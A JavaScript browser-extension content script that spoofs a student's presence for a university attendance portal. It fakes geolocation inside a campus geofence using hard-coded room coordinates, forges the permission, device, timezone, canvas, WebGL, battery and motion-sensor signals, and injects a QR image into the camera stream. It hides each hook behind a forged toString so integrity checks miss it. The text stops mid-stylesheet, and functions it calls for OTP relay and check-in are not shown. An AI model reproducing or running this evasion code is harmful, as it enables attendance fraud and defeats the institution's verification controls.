/**
 * content.js — MAIN world, document_start
 *
 * Stealth Level: Maximum
 *   - Native caching defeats late DOM-spy hooks
 *   - Function.prototype.toString cloaking defeats prototype integrity checks
 *   - Sensor fusion: DeviceMotion/Orientation at 60fps
 *   - Per-install randomized bridge event names (defeats signature matching)
 *   - Device accuracy profiles (defeats static telemetry fingerprinting)
 *   - Adaptive geofence centroid placement
 *   - OTP peer relay via configurable KV endpoint
 *   - QR dynamic auto-inject from sniffed API payload
 *   - Race-condition burst submission
 *   - Header injection for campus IP camouflage
 *   - Request timing jitter for behavioral normalization
 */

(function () {
  'use strict';

  // Fast bail-out on private infrastructure IPs (router, NAS, Proxmox)
  const host = window.location.hostname;
  if (/^(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)/.test(host)) {
    return;
  }

  // ── Phase 1: Native Function Caching ─────────────────────────────────────
  const _addEventListener    = window.addEventListener.bind(window);
  const _removeEventListener = window.removeEventListener.bind(window);
  const _dispatchEvent       = window.dispatchEvent.bind(window);
  const _CustomEvent         = CustomEvent;
  const _setTimeout          = setTimeout;
  const _setInterval         = setInterval;
  const _clearInterval       = clearInterval;
  const _origFetch           = window.fetch ? window.fetch.bind(window) : null;
  const _origXHROpen         = XMLHttpRequest.prototype.open;
  const _origXHRSend         = XMLHttpRequest.prototype.send;
  const _origXHRSetHeader    = XMLHttpRequest.prototype.setRequestHeader;

  const _geoProto               = Geolocation.prototype;
  const _origGetCurrentPosition = _geoProto.getCurrentPosition;
  const _origWatchPosition      = _geoProto.watchPosition;
  const _origClearWatch         = _geoProto.clearWatch;

  // ── Phase 2: .toString() Cloaking ────────────────────────────────────────
  const _origFnToString = Function.prototype.toString;
  const _nativeStringMap = new Map();

  let _inToString = false;
  const _toStringProxy = new Proxy(_origFnToString, {
    apply(target, thisArg, args) {
      if (thisArg === _toStringProxy || thisArg === _origFnToString) {
        return 'function toString() { [native code] }';
      }
      if (_inToString) return Reflect.apply(target, thisArg, args);
      _inToString = true;
      try {
        if (_nativeStringMap.has(thisArg)) return _nativeStringMap.get(thisArg);
        return Reflect.apply(target, thisArg, args);
      } finally {
        _inToString = false;
      }
    }
  });

  _nativeStringMap.set(_toStringProxy, 'function toString() { [native code] }');
  _nativeStringMap.set(_origFnToString, 'function toString() { [native code] }');
  try { Function.prototype.toString = _toStringProxy; } catch (_) {}

  function _cloak(fn, nativeStr) { _nativeStringMap.set(fn, nativeStr); }

  // ── Secure State ─────────────────────────────────────────────────────────
  let currentConfig  = null;
  const _fakeWatchIds  = new Set();
  const watchIntervals = new Map();
  const activeDrifts   = new Map();

  // ── Accuracy Profile Definitions ──────────────────────────────────────────
  const ACCURACY_PROFILES = {
    mobile_gps: {
      accuracyMin: 4,   accuracyMax: 10,
      altAccuracyMin: 6, altAccuracyMax: 12,
      altitudeM: 7.5,   altitudeDelta: 1.2,
    },
    desktop: {
      accuracyMin: 20,  accuracyMax: 40,
      altAccuracyMin: 25, altAccuracyMax: 50,
      altitudeM: 10,    altitudeDelta: 3,
    },
    low_signal: {
      accuracyMin: 50,  accuracyMax: 120,
      altAccuracyMin: 60, altAccuracyMax: 150,
      altitudeM: 7.5,   altitudeDelta: 5,
    },
  };

  function getProfile() {
    const key = (currentConfig && currentConfig.profile) || 'mobile_gps';
    return ACCURACY_PROFILES[key] || ACCURACY_PROFILES.mobile_gps;
  }

  // Diagnostic whitelist
  const DIAGNOSTIC_DOMAINS = [
    'browserleaks.com', 'html5demos.com', 'my-location.org',
    'w3schools.com', 'where-am-i.org', 'localhost', '127.0.0.1'
  ];

  function isDomainAllowed(hostname, targetDomain, testMode) {
    if (testMode === true) return true;
    if (!hostname) return false;
    if (targetDomain && (hostname === targetDomain || hostname.endsWith('.' + targetDomain))) return true;
    for (let i = 0; i < DIAGNOSTIC_DOMAINS.length; i++) {
      const d = DIAGNOSTIC_DOMAINS[i];
      if (hostname === d || hostname.endsWith('.' + d)) return true;
    }
    return false;
  }

  function getSpoofConfig() {
    if (!currentConfig) return null;
    const targetDomain = currentConfig.targetDomain || 'portal.university.edu';
    if (!isDomainAllowed(window.location.hostname, targetDomain, currentConfig.testMode)) return null;
    if (currentConfig.enabled && currentConfig.lat !== null && currentConfig.lng !== null) {
      return currentConfig;
    }
    return null;
  }

  // ── Position Builders ──────────────────────────────────────────────────────
  function coordJitter() {
    const u = 1 - Math.random();
    const v = 1 - Math.random();
    const n = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
    return n * 0.000015;
  }

  // Adaptive jitter based on geofence radius — tighter radius = tighter jitter
  function coordJitterAdaptive(radiusM) {
    if (!radiusM || radiusM <= 0) return coordJitter();
    // 1 meter ≈ 0.000009 degrees. Place within 60% of declared radius
    const deg = (radiusM * 0.000009) * 0.6;
    const u = 1 - Math.random();
    const v = 1 - Math.random();
    const n = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
    return n * (deg / 3);
  }

  function buildPosition(lat, lng, radiusM) {
    const p = getProfile();
    const accuracy         = p.accuracyMin + Math.random() * (p.accuracyMax - p.accuracyMin);
    const altitudeAccuracy = p.altAccuracyMin + Math.random() * (p.altAccuracyMax - p.altAccuracyMin);
    const altitude         = p.altitudeM + (Math.random() * p.altitudeDelta * 2 - p.altitudeDelta);
    const jitterFn = radiusM ? coordJitterAdaptive.bind(null, radiusM) : coordJitter;
    return {
      coords: {
        latitude:         parseFloat(lat) + jitterFn(),
        longitude:        parseFloat(lng) + jitterFn(),
        altitude:         altitude,
        accuracy:         Math.round(accuracy),
        altitudeAccuracy: Math.round(altitudeAccuracy),
        heading:          null,
        speed:            null,
      },
      timestamp: Date.now(),
    };
  }

  function getRealisticDelay() {
    // Human GPS acquisition: 400–1200ms
    return 400 + Math.random() * 800;
  }

  function simulateKineticDrift(baseLat, baseLng, watchId) {
    if (!activeDrifts.has(watchId)) {
      activeDrifts.set(watchId, { lat: parseFloat(baseLat), lng: parseFloat(baseLng) });
    }
    const current = activeDrifts.get(watchId);
    // Coupled drift: same drift direction applied to both axes
    const drift = (Math.random() - 0.5) * 0.00002;
    current.lat += drift * (0.8 + Math.random() * 0.4);
    current.lng += drift * (0.7 + Math.random() * 0.6);

    const p       = getProfile();
    const accuracy = p.accuracyMin + Math.random() * (p.accuracyMax - p.accuracyMin);
    const speed    = Math.random() * 0.3;
    const heading  = speed > 0.1 ? Math.random() * 360 : null;

    return {
      coords: {
        latitude:         current.lat,
        longitude:        current.lng,
        altitude:         p.altitudeM + (Math.random() * p.altitudeDelta * 2 - p.altitudeDelta),
        accuracy:         Math.round(accuracy),
        altitudeAccuracy: Math.round(p.altAccuracyMin + Math.random() * (p.altAccuracyMax - p.altAccuracyMin)),
        heading:          heading,
        speed:            speed,
      },
      timestamp: Date.now(),
    };
  }

  // ── Telemetry Helper ──────────────────────────────────────────────────────
  function _sendSubmitTelemetry(lat, lng) {
    try {
      const payload = {
        type: 'PRESENSI_SUBMIT', lat: String(lat), lng: String(lng),
        profile: (currentConfig && currentConfig.profile) || 'mobile_gps',
        ts: Date.now()
      };
      _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', { detail: JSON.stringify(payload) }));
    } catch (_) {}
  }

  let _resultSent = false;
  function _sendResultTelemetry(status) {
    if (_resultSent) return;
    _resultSent = true;
    try {
      const payload = { type: 'PRESENSI_RESULT', status, ts: Date.now() };
      _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', { detail: JSON.stringify(payload) }));
    } catch (_) {}
  }

  // ── Geolocation Proxy Hooks ────────────────────────────────────────────────
  const getCurrentPositionProxy = new Proxy(_origGetCurrentPosition, {
    apply(target, thisArg, argumentsList) {
      const cfg = getSpoofConfig();
      if (cfg) {
        const [successCallback] = argumentsList;
        _setTimeout(() => {
          const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
          if (typeof successCallback === 'function') successCallback(pos);
        }, getRealisticDelay());
      } else {
        return Reflect.apply(target, thisArg, argumentsList);
      }
    }
  });

  const watchPositionProxy = new Proxy(_origWatchPosition, {
    apply(target, thisArg, argumentsList) {
      const cfg = getSpoofConfig();
      if (cfg) {
        const [successCallback] = argumentsList;
        const fakeId = Math.floor(Math.random() * 999999) + 1;
        _fakeWatchIds.add(fakeId);
        _setTimeout(() => {
          if (_fakeWatchIds.has(fakeId) && typeof successCallback === 'function') {
            successCallback(simulateKineticDrift(cfg.lat, cfg.lng, fakeId));
            const driftInterval = _setInterval(() => {
              if (_fakeWatchIds.has(fakeId)) {
                successCallback(simulateKineticDrift(cfg.lat, cfg.lng, fakeId));
              } else {
                _clearInterval(driftInterval);
                watchIntervals.delete(fakeId);
              }
            }, 2000 + Math.random() * 3000);
            watchIntervals.set(fakeId, driftInterval);
          }
        }, getRealisticDelay());
        return fakeId;
      } else {
        return Reflect.apply(target, thisArg, argumentsList);
      }
    }
  });

  const clearWatchProxy = new Proxy(_origClearWatch, {
    apply(target, thisArg, argumentsList) {
      const [watchId] = argumentsList;
      if (_fakeWatchIds.has(watchId)) {
        _fakeWatchIds.delete(watchId);
        activeDrifts.delete(watchId);
        if (watchIntervals.has(watchId)) {
          _clearInterval(watchIntervals.get(watchId));
          watchIntervals.delete(watchId);
        }
        return;
      }
      return Reflect.apply(target, thisArg, argumentsList);
    }
  });

  _cloak(getCurrentPositionProxy, 'function getCurrentPosition() { [native code] }');
  _cloak(watchPositionProxy,      'function watchPosition() { [native code] }');
  _cloak(clearWatchProxy,         'function clearWatch() { [native code] }');
  _cloak(_toStringProxy,          'function toString() { [native code] }');

  try {
    _geoProto.getCurrentPosition = getCurrentPositionProxy;
    _geoProto.watchPosition      = watchPositionProxy;
    _geoProto.clearWatch         = clearWatchProxy;
  } catch (_) {}

  // Permissions API: return 'granted' for geolocation when spoofing
  if (navigator.permissions && typeof navigator.permissions.query === 'function') {
    const _origPermissionsQuery = navigator.permissions.query.bind(navigator.permissions);
    const permissionsQueryProxy = new Proxy(_origPermissionsQuery, {
      apply(target, thisArg, args) {
        const [descriptor] = args;
        if (descriptor && descriptor.name === 'geolocation' && getSpoofConfig()) {
          const fakeStatus = {
            state: 'granted', name: 'geolocation', onchange: null,
            addEventListener: function() {}, removeEventListener: function() {},
            dispatchEvent: function() { return true; }
          };
          if (typeof PermissionStatus !== 'undefined') {
            Object.setPrototypeOf(fakeStatus, PermissionStatus.prototype);
          }
          return Promise.resolve(fakeStatus);
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(permissionsQueryProxy, 'function query() { [native code] }');
    try { navigator.permissions.query = permissionsQueryProxy; } catch (_) {}
  }

  // ── Device Spoofing ────────────────────────────────────────────────────────
  function applyDeviceSpoofing(deviceMode) {
    if (!deviceMode || deviceMode === 'desktop') return;
    let vendor = '', platform = '', touch = 0;
    if (deviceMode === 'android') {
      vendor = 'Google Inc.'; platform = 'Linux armv8l'; touch = 5;
    } else if (deviceMode === 'ios') {
      vendor = 'Apple Computer, Inc.'; platform = 'iPhone'; touch = 5;
    }
    try {
      if (vendor)   Object.defineProperty(navigator, 'vendor',         { get: () => vendor, configurable: true });
      if (platform) Object.defineProperty(navigator, 'platform',       { get: () => platform, configurable: true });
      if (touch)    Object.defineProperty(navigator, 'maxTouchPoints',  { get: () => touch, configurable: true });

      // Network Information API emulation
      const conn = {
        downlink: 10.5,
        effectiveType: '4g',
        rtt: 55,
        saveData: false,
        type: 'cellular',
        onchange: null,
        addEventListener: function() {},
        removeEventListener: function() {},
        dispatchEvent: function() { return true; }
      };
      Object.defineProperty(navigator, 'connection', { get: () => conn, configurable: true });

      // User-Agent Client Hints (UA-CH) emulation
      if (deviceMode === 'android') {
        const uad = {
          brands: [
            { brand: 'Chromium', version: '112' },
            { brand: 'Google Chrome', version: '112' },
            { brand: 'Not:A-Brand', version: '99' }
          ],
          mobile: true,
          platform: 'Android',
          getHighEntropyValues: function() {
            return Promise.resolve({
              architecture: 'arm',
              bitness: '64',
              brands: [
                { brand: 'Chromium', version: '112' },
                { brand: 'Google Chrome', version: '112' },
                { brand: 'Not:A-Brand', version: '99' }
              ],
              mobile: true,
              model: 'SM-S918B',
              platform: 'Android',
              platformVersion: '13',
              uaFullVersion: '112.0.0.0'
            });
          },
          toJSON: function() {
            return { brands: this.brands, mobile: true, platform: 'Android' };
          }
        };
        _cloak(uad.getHighEntropyValues, 'function getHighEntropyValues() { [native code] }');
        Object.defineProperty(navigator, 'userAgentData', { get: () => uad, configurable: true });
      } else if (deviceMode === 'ios') {
        // iOS Safari does not define userAgentData
        Object.defineProperty(navigator, 'userAgentData', { get: () => undefined, configurable: true });
      }

      // Screen & Orientation emulation
      const screenW = deviceMode === 'ios' ? 393 : 412;
      const screenH = deviceMode === 'ios' ? 852 : 915;
      Object.defineProperty(screen, 'width',       { get: () => screenW, configurable: true });
      Object.defineProperty(screen, 'height',      { get: () => screenH, configurable: true });
      Object.defineProperty(screen, 'availWidth',  { get: () => screenW, configurable: true });
      Object.defineProperty(screen, 'availHeight', { get: () => screenH - 48, configurable: true });

      if (screen.orientation) {
        const fakeOrient = {
          angle: 0,
          type: 'portrait-primary',
          onchange: null,
          addEventListener: function() {},
          removeEventListener: function() {},
          dispatchEvent: function() { return true; },
          lock: function() { return Promise.resolve(); },
          unlock: function() {}
        };
        _cloak(fakeOrient.lock, 'function lock() { [native code] }');
        _cloak(fakeOrient.unlock, 'function unlock() { [native code] }');
        Object.defineProperty(screen, 'orientation', { get: () => fakeOrient, configurable: true });
      }
      Object.defineProperty(window, 'orientation', { get: () => 0, configurable: true });
    } catch (_) {}
  }

  // ── Phase 2.5: Maximum Stealth Anti-Fingerprinting ────────────────────────

  // 1. Timezone Lock
  const _origGetTimezoneOffset = Date.prototype.getTimezoneOffset;
  const _tzOffsetProxy = new Proxy(_origGetTimezoneOffset, {
    apply(target, thisArg, args) {
      if (getSpoofConfig()) return -420;
      return Reflect.apply(target, thisArg, args);
    }
  });
  _cloak(_tzOffsetProxy, 'function getTimezoneOffset() { [native code] }');
  try { Date.prototype.getTimezoneOffset = _tzOffsetProxy; } catch (_) {}

  if (window.Intl && Intl.DateTimeFormat) {
    const _origResolvedOptions = Intl.DateTimeFormat.prototype.resolvedOptions;
    const _resolvedOptionsProxy = new Proxy(_origResolvedOptions, {
      apply(target, thisArg, args) {
        const opts = Reflect.apply(target, thisArg, args);
        if (getSpoofConfig()) return Object.assign({}, opts, { timeZone: 'Asia/Jakarta' });
        return opts;
      }
    });
    _cloak(_resolvedOptionsProxy, 'function resolvedOptions() { [native code] }');
    try { Intl.DateTimeFormat.prototype.resolvedOptions = _resolvedOptionsProxy; } catch (_) {}
  }

  // 2. WebRTC IP Leak Protection
  if (window.RTCPeerConnection) {
    const _origRTCPeerConnection = window.RTCPeerConnection;
    const RTCPeerConnectionProxy = new Proxy(_origRTCPeerConnection, {
      construct(target, args) {
        const pc = new target(...args);
        if (getSpoofConfig()) {
          const _origAdd = pc.addEventListener.bind(pc);
          pc.addEventListener = function(type, listener, options) {
            if (type === 'icecandidate' && typeof listener === 'function') {
              const wrapped = function(event) {
                if (event && event.candidate && event.candidate.candidate) {
                  const c = event.candidate.candidate;
                  if (/(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)/.test(c)) return;
                }
                return listener.apply(this, arguments);
              };
              return _origAdd(type, wrapped, options);
            }
            return _origAdd(type, listener, options);
          };
          let _customIceHandler = null;
          try {
            Object.defineProperty(pc, 'onicecandidate', {
              get: () => _customIceHandler,
              set: (fn) => {
                if (typeof fn === 'function') {
                  _customIceHandler = function(event) {
                    if (event && event.candidate && event.candidate.candidate) {
                      const c = event.candidate.candidate;
                      if (/(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)/.test(c)) return;
                    }
                    return fn.apply(this, arguments);
                  };
                } else { _customIceHandler = fn; }
              },
              configurable: true, enumerable: true
            });
          } catch (_) {}
        }
        return pc;
      }
    });
    _cloak(RTCPeerConnectionProxy, 'function RTCPeerConnection() { [native code] }');
    try {
      window.RTCPeerConnection = RTCPeerConnectionProxy;
      if (window.webkitRTCPeerConnection) window.webkitRTCPeerConnection = RTCPeerConnectionProxy;
    } catch (_) {}
  }

  // 3. Canvas & WebGL Micro-Noise
  if (window.CanvasRenderingContext2D && CanvasRenderingContext2D.prototype.getImageData) {
    const _origGetImageData = CanvasRenderingContext2D.prototype.getImageData;
    const getImageDataProxy = new Proxy(_origGetImageData, {
      apply(target, thisArg, args) {
        const imgData = Reflect.apply(target, thisArg, args);
        if (getSpoofConfig() && imgData && imgData.data && imgData.data.length >= 4) {
          imgData.data[0] = (imgData.data[0] ^ 1) & 0xFF;
        }
        return imgData;
      }
    });
    _cloak(getImageDataProxy, 'function getImageData() { [native code] }');
    try { CanvasRenderingContext2D.prototype.getImageData = getImageDataProxy; } catch (_) {}
  }

  if (window.HTMLCanvasElement && HTMLCanvasElement.prototype.toDataURL) {
    const _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
    const toDataURLProxy = new Proxy(_origToDataURL, {
      apply(target, thisArg, args) {
        if (getSpoofConfig()) {
          try {
            if (thisArg.width > 0 && thisArg.width <= 256 && thisArg.height > 0 && thisArg.height <= 256) {
              const ctx = thisArg.getContext('2d');
              if (ctx) {
                const pixel = ctx.getImageData(0, 0, 1, 1);
                if (pixel && pixel.data) {
                  pixel.data[0] = (pixel.data[0] ^ 1) & 0xFF;
                  ctx.putImageData(pixel, 0, 0);
                }
              }
            }
          } catch (_) {}
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(toDataURLProxy, 'function toDataURL() { [native code] }');
    try { HTMLCanvasElement.prototype.toDataURL = toDataURLProxy; } catch (_) {}
  }

  function _patchWebGLContext(proto) {
    if (!proto || !proto.getParameter) return;
    const _origGetParam = proto.getParameter;
    const getParamProxy = new Proxy(_origGetParam, {
      apply(target, thisArg, args) {
        const param = args[0];
        const cfg = getSpoofConfig();
        if (cfg) {
          if (param === 37445) return cfg.deviceMode === 'ios' ? 'Apple Inc.' : 'Google Inc. (NVIDIA)';
          if (param === 37446) return cfg.deviceMode === 'ios' ? 'Apple GPU' : 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)';
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(getParamProxy, 'function getParameter() { [native code] }');
    try { proto.getParameter = getParamProxy; } catch (_) {}
  }
  if (window.WebGLRenderingContext)  _patchWebGLContext(WebGLRenderingContext.prototype);
  if (window.WebGL2RenderingContext) _patchWebGLContext(WebGL2RenderingContext.prototype);

  // 4. Hardware Concurrency, Device Memory & Battery
  try {
    Object.defineProperty(navigator, 'hardwareConcurrency', {
      get: () => {
        const cfg = getSpoofConfig();
        if (cfg && (cfg.deviceMode === 'android' || cfg.deviceMode === 'ios')) return 4;
        return 8;
      },
      configurable: true
    });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8, configurable: true });
  } catch (_) {}

  const _sessionStartTs = Date.now();
  if (navigator.getBattery) {
    const _origGetBattery = navigator.getBattery.bind(navigator);
    const getBatteryProxy = new Proxy(_origGetBattery, {
      apply(target, thisArg, args) {
        if (getSpoofConfig()) {
          const cfg = getSpoofConfig();
          const isMobile = cfg && (cfg.deviceMode === 'android' || cfg.deviceMode === 'ios');
          const elapsedMinutes = (Date.now() - _sessionStartTs) / 60000;
          const baseLevel = 0.85 - (elapsedMinutes * 0.003);
          const level = Math.max(0.25, Math.min(0.95, baseLevel));
          return Promise.resolve({
            charging: !isMobile,
            chargingTime: isMobile ? Infinity : 1800,
            dischargingTime: isMobile ? 14400 : Infinity,
            level: parseFloat(level.toFixed(2)),
            onchargingchange: null, onchargingtimechange: null,
            ondischargingtimechange: null, onlevelchange: null,
            addEventListener: function() {}, removeEventListener: function() {},
            dispatchEvent: function() { return true; }
          });
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(getBatteryProxy, 'function getBattery() { [native code] }');
    try { navigator.getBattery = getBatteryProxy; } catch (_) {}
  }

  // ── Phase 2.6: Virtual Camera & Attendance QR Injector ────────────────────
  let _virtualQrImage = null;

  function setVirtualQrImage(src) {
    if (!src) { _virtualQrImage = null; return; }
    const img = new Image();
    img.crossOrigin = 'anonymous';
    img.onload = () => { _virtualQrImage = img; };
    img.src = src;
  }

  function _createSyntheticQrStream(img) {
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');
    function drawFrame() {
      if (!_virtualQrImage) return;
      ctx.fillStyle = '#FFFFFF';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      const aspect = img.width / img.height;
      let drawW = canvas.width * 0.7;
      let drawH = drawW / aspect;
      if (drawH > canvas.height * 0.7) { drawH = canvas.height * 0.7; drawW = drawH * aspect; }
      const x = (canvas.width - drawW) / 2;
      const y = (canvas.height - drawH) / 2;
      ctx.drawImage(img, x, y, drawW, drawH);
    }
    drawFrame();
    _setInterval(drawFrame, 100);
    return canvas.captureStream ? canvas.captureStream(15) : null;
  }

  if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
    const _origGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
    const getUserMediaProxy = new Proxy(_origGetUserMedia, {
      apply(target, thisArg, args) {
        const constraints = args[0];
        if (getSpoofConfig() && _virtualQrImage && constraints && (constraints.video || typeof constraints === 'object')) {
          try {
            const stream = _createSyntheticQrStream(_virtualQrImage);
            if (stream) return Promise.resolve(stream);
          } catch (_) {}
        }
        return Reflect.apply(target, thisArg, args);
      }
    });
    _cloak(getUserMediaProxy, 'function getUserMedia() { [native code] }');
    try { navigator.mediaDevices.getUserMedia = getUserMediaProxy; } catch (_) {}
  }

  // ── Phase 3: Sensor Fusion Spoofing ───────────────────────────────────────
  let _sensorSpoofActive     = false;
  let _motionIntervalId      = null;
  let _orientationIntervalId = null;

  function _buildMotionEvent() {
    const breathDrift    = Math.sin(Date.now() / 800) * 0.12;
    const footstepJitter = (Math.random() - 0.5) * 0.08;
    return {
      acceleration: {
        x: breathDrift + footstepJitter,
        y: (Math.random() - 0.5) * 0.05,
        z: 9.81 + (Math.random() - 0.5) * 0.06,
      },
      accelerationIncludingGravity: {
        x: breathDrift + footstepJitter,
        y: (Math.random() - 0.5) * 0.05,
        z: 9.81 + (Math.random() - 0.5) * 0.06,
      },
      rotationRate: {
        alpha: (Math.random() - 0.5) * 0.3,
        beta:  (Math.random() - 0.5) * 0.3,
        gamma: (Math.random() - 0.5) * 0.2,
      },
      interval: 16.67,
    };
  }

  function _buildOrientationEvent() {
    return {
      alpha:    270 + (Math.random() - 0.5) * 2,
      beta:     30  + (Math.random() - 0.5) * 1.5,
      gamma:    (Math.random() - 0.5) * 2,
      absolute: false,
    };
  }

  function _dispatchFakeSensorEvents() {
    const motionData      = _buildMotionEvent();
    const orientationData = _buildOrientationEvent();
    try {
      const motionEvent = new DeviceMotionEvent('devicemotion', {
        acceleration:                motionData.acceleration,
        accelerationIncludingGravity: motionData.accelerationIncludingGravity,
        rotationRate:                motionData.rotationRate,
        interval:                    motionData.interval,
      });
      _dispatchEvent(motionEvent);
    } catch (_) {}
    try {
      const orientEvent = new DeviceOrientationEvent('deviceorientation', {
        alpha: orientationData.alpha, beta: orientationData.beta,
        gamma: orientationData.gamma, absolute: orientationData.absolute,
      });
      _dispatchEvent(orientEvent);
    } catch (_) {}
  }

  const _addEventListenerProxy = new Proxy(window.addEventListener, {
    apply(target, thisArg, args) {
      const [type] = args;
      if ((type === 'devicemotion' || type === 'deviceorientation') && getSpoofConfig()) {
        if (!_sensorSpoofActive) {
          _sensorSpoofActive = true;
          _motionIntervalId  = _setInterval(_dispatchFakeSensorEvents, 16);
        }
      }
      return Reflect.apply(target, thisArg, args);
    }
  });
  _cloak(_addEventListenerProxy, 'function addEventListener() { [native code] }');
  try { window.addEventListener = _addEventListenerProxy; } catch (_) {}

  function _stopSensorSpoof() {
    if (_sensorSpoofActive) {
      _sensorSpoofActive = false;
      if (_motionIntervalId)      { _clearInterval(_motionIntervalId);      _motionIntervalId = null; }
      if (_orientationIntervalId) { _clearInterval(_orientationIntervalId); _orientationIntervalId = null; }
    }
  }

  // ── Phase 4: Dynamic Bridge Handshake ─────────────────────────────────────
  const sessionToken = Math.random().toString(36).substring(2, 15);
  const reqEvent = '__gps_sync_req';
  const resEvent = '__gps_sync_res_' + sessionToken;

  let configReceived = false;
  _addEventListener(resEvent, (event) => {
    event.stopImmediatePropagation();
    if (event.detail && typeof event.detail === 'string') {
      try {
        currentConfig = JSON.parse(event.detail);
        configReceived = true;
        if (!currentConfig.enabled) {
          _stopSensorSpoof();
        } else {
          if (Array.isArray(currentConfig.timetable) && currentConfig.timetable.length > 0) {
            const slot = checkTimetableAutoMatch(currentConfig.timetable);
            if (slot && slot.lat != null && slot.lng != null) {
              currentConfig.lat = slot.lat;
              currentConfig.lng = slot.lng;
              currentConfig._timetableMatched = slot.subject || 'Timetable Slot';
            }
          }
          applyDeviceSpoofing(currentConfig.deviceMode);
        }
        _installNetworkInterceptors();
        _startOtpPoller();
      } catch (_) {}
    }
  }, true);

  function checkTimetableAutoMatch(timetable) {
    if (!timetable || !Array.isArray(timetable) || timetable.length === 0) return null;
    const now = new Date();
    const utcMs = now.getTime() + (now.getTimezoneOffset() * 60000);
    const wibDate = new Date(utcMs + (7 * 3600000));
    const day = wibDate.getDay();
    const currentMinutes = wibDate.getHours() * 60 + wibDate.getMinutes();
    for (let i = 0; i < timetable.length; i++) {
      const slot = timetable[i];
      if (slot.day !== day) continue;
      const [startH, startM] = (slot.start || '00:00').split(':').map(Number);
      const [endH, endM] = (slot.end || '23:59').split(':').map(Number);
      const startMin = (startH || 0) * 60 + (startM || 0);
      const endMin = (endH || 0) * 60 + (endM || 0);
      if (currentMinutes >= startMin && currentMinutes <= endMin) return slot;
    }
    return null;
  }

  let retries = 0;
  const MAX_RETRIES = 8;
  function requestConfig() {
    if (configReceived) return;
    if (retries >= MAX_RETRIES) return;
    retries++;
    _dispatchEvent(new _CustomEvent(reqEvent, { detail: sessionToken }));
    setTimeout(requestConfig, Math.min(15 * Math.pow(1.5, retries), 250));
  }
  requestConfig();

  // ── Auto-Room Matching ──────────────────────────────────────────────────────
  const CAMPUS_ROOM_PRESETS = [
    { regex: /\b(?:TW1|TOWER\s*1)\b/i,                        lat: -7.2849915,         lng: 112.793897,         label: 'Tower 1' },
    { regex: /\b(?:TW2|TOWER\s*2)\b/i,                        lat: -7.2852792,         lng: 112.7952975,        label: 'Tower 2' },
    { regex: /\b(?:KORIDC|KORIDOR\s*C|CLASS\s*C|KORIDOR)\b/i, lat: -7.284793988582386, lng: 112.79570676550246, label: 'Koridor C' },
  ];

  function detectRoomPreset(roomString) {
    if (!roomString || typeof roomString !== 'string') return null;
    for (let i = 0; i < CAMPUS_ROOM_PRESETS.length; i++) {
      if (CAMPUS_ROOM_PRESETS[i].regex.test(roomString)) return CAMPUS_ROOM_PRESETS[i];
    }
    if (currentConfig && Array.isArray(currentConfig.customPresets)) {
      for (let j = 0; j < currentConfig.customPresets.length; j++) {
        const cp = currentConfig.customPresets[j];
        if (!cp || cp.lat == null || cp.lng == null) continue;
        if (cp.regex) {
          try {
            const rx = new RegExp(cp.regex, 'i');
            if (rx.test(roomString)) return { lat: cp.lat, lng: cp.lng, label: cp.name || 'Custom Preset' };
          } catch (_) {}
        } else if (cp.name) {
          try {
            const escaped = cp.name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const rx = new RegExp('\\b' + escaped + '\\b', 'i');
            if (rx.test(roomString)) return { lat: cp.lat, lng: cp.lng, label: cp.name };
          } catch (_) {}
        }
      }
    }
    return null;
  }

  _addEventListener('pageshow', () => { configReceived = false; retries = 0; requestConfig(); });
  _addEventListener('online',   () => {
    configReceived = false; retries = 0; requestConfig();
    try {
      const q = sessionStorage.getItem('__presensi_pending_queue');
      if (q) {
        sessionStorage.removeItem('__presensi_pending_queue');
        const item = JSON.parse(q);
        if (item && item.code && _hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
          _hudContainer._refs.codeInput.value = item.code;
          _triggerCheckIn();
        }
      }
    } catch (_) {}
  });

  // ── Phase 4.5: HUD State ──────────────────────────────────────────────────
  let _hudContainer    = null;
  let _hudInterval     = null;
  let _activeMeetingData = null;

  function _formatCountdown(seconds) {
    if (seconds <= 0) return '00:00 (EXPIRED)';
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  }

  function _createOrUpdateHud(info) {
    if (!info || (!info.tm_mulai && info.status !== 'sedang_berlangsung')) return;
    const h = window.location.hostname;
    const targetDomain = (currentConfig && currentConfig.targetDomain) || 'portal.university.edu';
    if (h !== targetDomain && !h.endsWith('.' + targetDomain)) return;
    _activeMeetingData = info;

    if (!_hudContainer) {
      if (!document.body) {
        document.addEventListener('DOMContentLoaded', () => _createOrUpdateHud(info), { once: true });
        return;
      }
      _hudContainer = document.createElement('div');
      _hudContainer.id = 'campus-presensi-hud';

      const style = document.createElement('style');
      style.textContent = `
        #campus-presensi-hud {
          position: fixed;
          bottom: 24px;
          right: 24px;
          z-index: 999999;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
          background: rgba(26, 28, 30, 0.94);
          backdrop-filter: blur(12px);
          -webkit-backdrop-filter: blur(12px);
          border: 1px solid rgba(255, 255, 255, 0.12);
          border-radius: 12px;
          padding: 12px 16px;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
          color: #f3f4f6;
          min-width: 250px;
          max-width: 320px;
          font-size: 12px;
